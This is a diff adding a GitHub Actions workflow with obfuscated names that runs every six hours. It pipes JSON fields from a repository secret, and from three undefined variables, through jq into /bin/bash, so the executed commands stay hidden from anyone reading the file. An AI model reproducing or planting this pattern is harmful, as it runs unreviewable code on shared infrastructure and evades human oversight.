@@ -1,0 +1,20 @@
+name: yaqiangdeshuliangg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaqiangdeshuliangg
+        env:
+          vr82: ${{ secrets.vr82 }}
+        run: |
+          echo $vr82 | jq -r .r4 | /bin/bash
+          echo $vg91 | jq -r .c2 | /bin/bash
+          echo $qx8 | jq -r .ns7 | /bin/bash
+          echo $xs0031 | jq -r .z874 | /bin/bash
+
